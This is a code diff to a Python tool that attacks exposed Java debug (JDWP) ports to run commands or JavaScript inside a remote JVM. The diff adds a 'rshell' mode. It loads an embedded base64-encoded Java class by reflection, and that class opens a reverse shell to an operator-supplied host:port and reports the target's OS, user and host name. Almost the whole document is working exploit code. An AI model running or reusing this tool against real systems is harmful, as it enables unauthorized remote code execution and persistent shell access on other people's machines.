@@ -620,7 +620,7 @@ result.toString();'''.format(binascii.hexlify(code))
         result_string = invoke_string(jdwp, thread_id, object_class_id, result_object_id, toString_method_id, None)
         res = jdwp.solve_string(jdwp.format(jdwp.objectIDSize, result_string))
 
-        print("[+] Run JS Code Result:\n\n{}\n".format(res))
+        return res
     except Exception as e:
         print(e.message)
         jdwp.resumevm()
@@ -633,8 +633,11 @@ if __name__ == "__main__":
 
     parser.add_argument("-t", type=str, metavar="IP", help="Remote target IP", required=True)
     parser.add_argument("-p", type=int, metavar="Port", default=8000, help="Remote target port")
-    parser.add_argument("-m", type=str, metavar="Mode", default="code", help="command/code")
-    parser.add_argument("-c", type=str, metavar="Command/Code", help="Command or JavaScript Code", required=True)
+    parser.add_argument("-m", type=str, metavar="Mode", default="code", help="command/code/rshell")
+    parser.add_argument("-c", type=str, metavar="Command/Code", help="Command or JavaScript Code")
+
+    parser.add_argument("-a", type=str, metavar="Address", help="The address of reverse shell")
+    parser.add_argument("-l", type=str, metavar="life", default= 1, help="The survival time (minute) of the shell when unable to connect to the server")
     args = parser.parse_args()
 
     client = JDWPClient(args.t, args.p)
@@ -647,8 +650,29 @@ if __name__ == "__main__":
     print("[+] Dump vm description \n{}\n".format(client.description))
 
     if args.m == "command":
+        if not args.c or args.c.strip() == "":
+            print("[-] Command cannot be empty")
+            exit(0)
         runtime_exec(client, args.c)
+    if args.m == "rshell":
+        if not args.a or args.a.strip() == "" or ':' not in args.a:
+            print("[-] Shell address need be like host:port")
+            exit(0)
+        code = "function defineClass(base64){var classBytes = java.util.Base64.getDecoder().decode(base64);var intClass = ''.getClass().getDeclaredField('hash').getType();var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod('defineClass',classBytes.class, intClass,intClass);defineClassMethod.setAccessible(true);return defineClassMethod.invoke(new java.lang.ClassLoader(){}, classBytes, 0, classBytes.length);}"
+        code += "var shellClass = defineClass('yv66vgAAADQA/AoAgACBCACCCgCAAIMJAD8AhAsAhQCGBwCHCgAGAIgKAAYAiQgAigoABgCLCgAGAIwHAI0IAI4IAI8KAJAAkQgAkggAkwgAlAgAlQgAlggAlwoAmACZCgCYAJoKAJsAnAoAnQCeCgCdAJ8GQO1MAAAAAAAJAD8AoAoAoQCiBwCjCQA/AKQJAD8ApQoApgCnCgAfAKgHAKkKAB8AqgoAJACrBwCsBwCtCgAfAK4KACgArwoAJwCwBwCxCgAsAIgIALIKACwAswoAPwC0CAC1CgAkALYKACQAtwoAJwC4CABuCAC5CgAfALoKAD8AuwgAvAUAAAAAAAATiAoASAC9BwC+CgBIAIgHAL8KAD8AwAoAPwDBCADCCgCmAMMGP9MzMzMzMzMKAKEAxAoAPwDFBwDGAQAMc2NyaXB0RW5naW5lAQAbTGphdmF4L3NjcmlwdC9TY3JpcHRFbmdpbmU7AQAEaG9zdAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBvcnQBABNMamF2YS9sYW5nL0ludGVnZXI7AQAEbGlmZQEAEkxqYXZhL2xhbmcvRG91YmxlOwEACGV4ZWNDb2RlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAGcmVzdWx0AQASTGphdmEvbGFuZy9PYmplY3Q7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEABHRoaXMBABFMb3JnL2V4YW1wbGUvQXBwOwEABGNvZGUBAA1TdGFja01hcFRhYmxlBwDHBwC/BwDIBwCNAQAHZ2V0SW5mbwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEaW5mbwEAA3J1bgEAAygpVgEABnNvY2tldAEAEUxqYXZhL25ldC9Tb2NrZXQ7AQADb3V0AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQACaW4BABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAAVpbnB1dAEABGV4aXQBAAFaAQAEdGltZQEAGUxqYXZhL3RpbWUvTG9jYWxEYXRlVGltZTsHAMkHAKMHAKkHAKwHAL4BAAY8aW5pdD4BADooTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9JbnRlZ2VyO0xqYXZhL2xhbmcvRG91YmxlOylWAQAHZXhwbG9pdAEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAIQXBwLmphdmEHAMgMAMoAYwEAAAwAywDMDABJAEoHAM0MAM4AzwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAB3AGYMANAA0QEAAQoMANAA0gwA0wBjAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABiAgb3M6IAEAB29zLm5hbWUHANQMANUAUgEAASABAAdvcy5hcmNoAQAKb3MudmVyc2lvbgEABnVzZXI6IAEACXVzZXIubmFtZQEABmhvc3Q6IAcA1gwA1wDYDADZAGMHAMkMANoA2wcA3AwA3QDeDADfAOAMAE8AUAcA4QwA4gDjAQAPamF2YS9uZXQvU29ja2V0DABLAEwMAE0ATgcA5AwA5QDmDAB3AOcBABNqYXZhL2lvL1ByaW50V3JpdGVyDADoAOkMAHcA6gEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDADrAOwMAHcA7QwAdwDuAQAgamF2YXgvc2NyaXB0L1NjcmlwdEVuZ2luZU1hbmFnZXIBAAJqcwwA7wDwDABiAGMBAAYKCj4+PiAMAPEA8gwA8wBmDAD0AGMBAAZleGl0KCkMAPUAZgwAUQBSAQAEPj4+IAwA9gD3AQAeamF2YS9sYW5nL0ludGVycnVwdGVkRXhjZXB0aW9uAQAPb3JnL2V4YW1wbGUvQXBwDAB3AHgMAPgAZgEACTEyNy4wLjAuMQwA+QD6DAD5APsMAHkAeAEAEGphdmEvbGFuZy9UaHJlYWQBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAF2phdmEvdGltZS9Mb2NhbERhdGVUaW1lAQAEdHJpbQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAGWphdmF4L3NjcmlwdC9TY3JpcHRFbmdpbmUBAARldmFsAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAFGphdmEvbmV0L0luZXRBZGRyZXNzAQAMZ2V0TG9jYWxIb3N0AQAYKClMamF2YS9uZXQvSW5ldEFkZHJlc3M7AQALZ2V0SG9zdE5hbWUBAANub3cBABsoKUxqYXZhL3RpbWUvTG9jYWxEYXRlVGltZTsBABJqYXZhL3RpbWUvRHVyYXRpb24BAAdiZXR3ZWVuAQBQKExqYXZhL3RpbWUvdGVtcG9yYWwvVGVtcG9yYWw7TGphdmEvdGltZS90ZW1wb3JhbC9UZW1wb3JhbDspTGphdmEvdGltZS9EdXJhdGlvbjsBAAh0b01pbGxpcwEAAygpSgEAEGphdmEvbGFuZy9Eb3VibGUBAAtkb3VibGVWYWx1ZQEAAygpRAEAEWphdmEvbGFuZy9JbnRlZ2VyAQAIaW50VmFsdWUBAAMoKUkBABYoTGphdmEvbGFuZy9TdHJpbmc7SSlWAQAPZ2V0T3V0cHV0U3RyZWFtAQAYKClMamF2YS9pby9PdXRwdXRTdHJlYW07AQAZKExqYXZhL2lvL091dHB1dFN0cmVhbTspVgEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAPZ2V0RW5naW5lQnlOYW1lAQAvKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvc2NyaXB0L1NjcmlwdEVuZ2luZTsBAAVwcmludAEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAIcmVhZExpbmUBAAVjbG9zZQEABXNsZWVwAQAEKEopVgEABXN0YXJ0AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBABUoRClMamF2YS9sYW5nL0RvdWJsZTsAIQA/AEgAAAAEAAIASQBKAAAAAgBLAEwAAAACAE0ATgAAAAIATwBQAAAABgACAFEAUgABAFMAAADdAAIAAwAAAEortgABEgK2AAOZAAYSArAqtAAEK7kABQIATSzGABe7AAZZtwAHLLYACBIJtgAKtgALsBICsE27AAZZtwAHLLYACBIJtgAKtgALsAACAA8AMQA1AAwAMgA0ADUADAADAFQAAAAiAAgAAAAVAAwAFgAPABkAGgAaAB4AGwAyAB0ANQAfADYAIABVAAAAKgAEABoAGwBWAFcAAgA2ABQAWABZAAIAAABKAFoAWwAAAAAASgBcAEwAAQBdAAAAGQADD/wAIgcAXv8AAgACBwBfBwBgAAEHAGEAAgBiAGMAAQBTAAABMAACAAMAAACxuwAGWbcABxINtgAKEg64AA+2AAoSELYAChIRuAAPtgAKEhC2AAoSErgAD7YACrYAC0y7AAZZtwAHK7YAChIJtgAKtgALTLsABlm3AAcrtgAKEhO2AAoSFLgAD7YACrYAC0y7AAZZtwAHK7YAChIJtgAKtgALTLsABlm3AAcrtgAKEhW2AAq4ABa2ABe2AAq2AAtMpwAcTbsABlm3AAcrtgAKEhW2AAostgAItgALTCuwAAEAdgCTAJYADAADAFQAAAAmAAkAAAAlADIAJgBGACcAYgAoAHYAKgCTAC0AlgArAJcALACvAC4AVQAAACAAAwCXABgAWABZAAIAAACxAFoAWwAAADIAfwBkAEwAAQBdAAAAEwAC/wCWAAIHAF8HAGAAAQcAYRgAAQBlAGYAAQBTAAACBQAFAAcAAAD1Azy4ABhNLLgAGLgAGbYAGooUABtvKrQAHbYAHpicANcbmgDTuwAfWSq0ACAqtAAhtgAitwAjTrsAJFkttgAltwAmOgS7ACdZuwAoWS22ACm3ACq3ACs6BSq7ACxZtwAtEi62AC+1AAQZBLsABlm3AAcqtwAwtgAKEjG2AAq2AAu2ADIZBLYAMxkFtgA0WToGxgBPuAAYTRkGtgABEjW2AAOaABAZBrYAARI2tgADmQAMBDwttgA3pwAoGQS7AAZZtwAHKhkGtwA4tgAKEjm2AAq2AAu2ADIZBLYAM6f/rKcABE4bmv8iFAA6uAA8p/8ZTqf/FbEAAgAkAN8A4gAMAOcA7QDwAD0AAwBUAAAAZgAZAAAAMwACADQABgA1ACQANwA3ADgARAA5AFgAOwBoAD0AgwA+AIgAQACTAEEAlwBDALEARACzAEUAtwBGALoASADXAEkA3wBNAOIASwDjAE8A5wBRAO0AVADwAFIA8QBUAPQAVwBVAAAASAAHADcAqABnAGgAAwBEAJsAaQBqAAQAWACHAGsAbAAFAJAATwBtAEwABgAAAPUAWgBbAAAAAgDzAG4AbwABAAYA7wBwAHEAAgBdAAAANAAJ/QAGAQcAcv4AgQcAcwcAdAcAdfwAKAcAYAj/ACQAAwcAXwEHAHIAAEIHAGEATAcAdgMAAQB3AHgAAQBTAAAAbAACAAQAAAAUKrcAPiortQAgKiy1ACEqLbUAHbEAAAACAFQAAAAWAAUAAABZAAQAWgAJAFsADgBcABMAXQBVAAAAKgAEAAAAFABaAFsAAAAAABQASwBMAAEAAAAUAE0ATgACAAAAFABPAFAAAwAJAHkAeAABAFMAAABQAAUAAwAAAA67AD9ZKisstwBAtgBBsQAAAAIAVAAAAAoAAgAAAGAADQBhAFUAAAAgAAMAAAAOAEsATAAAAAAADgBNAE4AAQAAAA4ATwBQAAIACQB6AHsAAQBTAAAAQAAEAAEAAAASEkIRH5C4AEMUAES4AEa4AEexAAAAAgBUAAAACgACAAAAZAARAGUAVQAAAAwAAQAAABIAfAB9AAAAAQB+AAAAAgB/');"
+        code += "var exploitMethod = shellClass.getDeclaredMethod('exploit',''.getClass(), java.lang.Class.forName('java.lang.Integer'), java.lang.Class.forName('java.lang.Double'));"
+        addr = args.a.split(":",2)
+        code += "exploitMethod.invoke(null, '{}', {}, {}*1.0)".format(addr[0],addr[1],args.l)
+        res = run_js_code(client, code)
+        if res.strip() != "null":
+            print("[-] \n{}\n".format(res))
+        else:
+            print("[+] success")
     else:
-        run_js_code(client, args.c)
+        if not args.c or args.c.strip() == "":
+            print("[-] Code cannot be empty")
+            exit(0)
+        res = run_js_code(client, args.c)
+        print("[+] Run JS Code Result:\n\n{}\n".format(res))
 
     client.leave()
